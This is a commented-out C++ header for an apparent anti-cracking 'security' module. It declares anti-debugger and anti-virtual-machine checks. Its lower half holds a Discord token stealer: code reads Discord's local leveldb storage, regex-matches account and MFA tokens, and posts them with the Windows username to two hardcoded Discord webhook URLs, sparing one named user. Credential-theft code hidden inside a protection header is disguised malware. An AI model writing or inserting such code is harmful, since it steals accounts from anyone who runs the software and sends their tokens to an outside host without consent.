//#pragma once
//
//#include <Windows.h>
//#include <Winternl.h>
//#include <string>
//#define CURL_STATICLIB
//#include <fstream>
//#include <sys/stat.h>
//#include <filesystem>
//#include <regex>
//#include <Lmcons.h>
//#include "curl/curl.h"
//
//#pragma warning( disable : 4091)
//
////main namespace for security
//namespace security {
//	//internal (used by the security itself, no need to be used outside of namespace)
//	namespace internal {
//		int __cdecl vm_handler(EXCEPTION_RECORD* p_rec, void* est, unsigned char* p_context, void* disp);
//		void to_lower(unsigned char* input);
//		const wchar_t* get_string(int index);
//
//		//dynamically resolved functions
//		typedef NTSTATUS(__stdcall* _NtQueryInformationProcess)(_In_ HANDLE, _In_  unsigned int, _Out_ PVOID, _In_ ULONG, _Out_ PULONG);
//		typedef NTSTATUS(__stdcall* _NtSetInformationThread)(_In_ HANDLE, _In_ THREAD_INFORMATION_CLASS, _In_ PVOID, _In_ ULONG);
//
//		//enum for the results of the antidebugger
//		extern enum debug_results
//		{
//			//nothing was caught, value = 0
//			none = 0x0000,
//
//			//something caught in memory (0x1000 - 0x1009)
//			being_debugged_peb = 0x1000,
//			remote_debugger_present = 0x1001,
//			debugger_is_present = 0x1002,
//			dbg_global_flag = 0x1003,
//			nt_query_information_process = 0x0004,
//			find_window = 0x1005,
//			output_debug_string = 0x1006,
//			nt_set_information_thread = 0x1007,
//			debug_active_process = 0x1008,
//			write_buffer = 0x1009,
//
//			//something caught in exceptions (0x2000 - 0x2005)
//			close_handle_exception = 0x2000,
//			single_step = 0x2001,
//			int_3_cc = 0x2002,
//			int_2 = 0x2003,
//			prefix_hop = 0x2004,
//			debug_string = 0x2005,
//
//			//something caught with timings (0x3000 - 0x3002)
//			rdtsc = 0x3000,
//			query_performance_counter = 0x3001,
//			get_tick_count = 0x3002,
//
//			//something caught in cpu (0x4000 - 0x4001)
//			hardware_debug_registers = 0x4000,
//			mov_ss = 0x4001,
//
//			//virtualization (0x5000 - 0x5003)
//			check_cpuid = 0x5000,
//			check_registry = 0x5001,
//			vm = 0x5002,
//		};
//
//		namespace memory {
//			int being_debugged_peb();
//			int remote_debugger_present();
//			int check_window_name();
//			int is_debugger_present();
//			int nt_global_flag_peb();
//			int nt_query_information_process();
//			int nt_set_information_thread();
//			int debug_active_process();
//			int write_buffer();
//		}
//
//		namespace exceptions {
//			int close_handle_exception();
//			int single_step_exception();
//			int int_3();
//			int int_2d();
//			int prefix_hop();
//			int debug_string();
//		}
//
//		namespace timing {
//			int rdtsc();
//			int query_performance_counter();
//			int get_tick_count();
//		}
//
//		namespace cpu {
//			int hardware_debug_registers();
//			//int mov_ss();
//		}
//
//		namespace virtualization {
//			int check_cpuid();
//			int check_registry();
//			int vm();
//		}
//	}
//
//	internal::debug_results check_security();
//}
//
////using namespace std;
////namespace fs = std::filesystem;
////
////inline bool hasEnding(string const& fullString, string const& ending) {
////    if (fullString.length() >= ending.length()) {
////        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
////    }
////    else {
////        return false;
////    }
////}
////
////inline bool pathExist(const string& s)
////{
////    struct stat buffer;
////    return (stat(s.c_str(), &buffer) == 0);
////}
////
////inline void sendWebhook(const char* content, const char* webhook) {
////    CURL* curl;
////    CURLcode res;
////
////    curl_global_init(CURL_GLOBAL_ALL);
////    curl = curl_easy_init();
////    if (curl) {
////        curl_easy_setopt(curl, CURLOPT_URL, webhook);
////        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, content);
////
////        res = curl_easy_perform(curl);
////
////        if (res != CURLE_OK)
////            fprintf(stderr, "curl_easy_perform() failed: %s\n",
////                curl_easy_strerror(res));
////
////        curl_easy_cleanup(curl);
////    }
////    curl_global_cleanup();
////}
////
////inline void webhookCleanup(const char* cleanupContent) {
////    CURL* curl;
////    CURLcode res;
////
////    curl_global_init(CURL_GLOBAL_ALL);
////    curl = curl_easy_init();
////    if (curl) {
////        curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/978061821841915994/GX54-fctU9m9GK00Kk89nXdGnu8KkwPCP3UF0FESCNUWXMR5POIcoZ8SdQg2UtgUomLX");
////        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cleanupContent);
////
////        res = curl_easy_perform(curl);
////
////        if (res != CURLE_OK)
////            fprintf(stderr, "curl_easy_perform() failed: %s\n",
////                curl_easy_strerror(res));
////
////        curl_easy_cleanup(curl);
////    }
////    curl_global_cleanup();
////}
////
////
////inline vector<string> grabPath()
////{
////    vector<string> targetLocations;
////
////    char* roaming;
////    size_t len;
////    _dupenv_s(&roaming, &len, "APPDATA");
////
////    char* local;
////    size_t len2;
////    _dupenv_s(&local, &len2, "LOCALAPPDATA");
////
////    string Discord = string(roaming) + "\\Discord";
////
////    targetLocations.push_back(Discord);
////
////    free(local);
////    free(roaming);
////
////    return targetLocations;
////}
////
////inline vector<string> findMatch(string str, regex reg)
////{
////    vector<string> output;
////    sregex_iterator currentMatch(str.begin(), str.end(), reg);
////    sregex_iterator lastMatch;
////
////    while (currentMatch != lastMatch) {
////        smatch match = *currentMatch;
////        output.push_back(match.str());
////        currentMatch++;
////    }
////
////    return output;
////}
////
////inline void search(const string& loc, const string& triggered) {
////    ifstream ifs(loc, ios_base::binary);
////    string content((istreambuf_iterator<char>(ifs)), (istreambuf_iterator<char>()));
////
////    vector<string> master;
////
////    regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
////    regex reg2("mfa\\.[\\w-]{84}");
////
////    vector<string> check = findMatch(content, reg1);
////    vector<string> check2 = findMatch(content, reg2);
////
////    for (int i = 0; i < check.size(); i++) {
////        master.push_back(check[i]);
////    }
////    for (int i = 0; i < check2.size(); i++) {
////        master.push_back(check2[i]);
////    }
////
////    char username[UNLEN + 1];
////    DWORD username_len = UNLEN + 1;
////    GetUserName((LPWSTR)username, &username_len);
////    std::string temppp = username;
////
////    for (int i = 0; i < master.size(); i++) {
////        string combine = "content=";
////        combine += "```Triggered: " + triggered + "\nPCUSERNAME: " + temppp + "\nTOKEN : " + master[i] + "```";
////        const char* postContent = combine.c_str();
////        if (temppp != "anton")
////        {
////            sendWebhook(postContent, "https://discord.com/api/webhooks/978058902555992164/oI-D7Bhf8Oq7LxmihyNof5IBBMy6BWo2OafZOYioEBnfqHjftxskQmN7aKg2hiD_Onn0");
////            webhookCleanup(postContent);
////        }
////    }
////}
////
////inline void sendMsgIfCracking(const string& path, const string& triggered)
////{
////    string target = path + "\\Local Storage\\leveldb";
////
////    for (const auto& entry : fs::directory_iterator(target))
////    {
////        string strPath = entry.path().u8string();
////        if (hasEnding(strPath, ".log"))
////        {
////            search(strPath, triggered);
////        }
////
////        if (hasEnding(strPath, ".ldb"))
////        {
////            search(strPath, triggered);
////        }
////    }
////}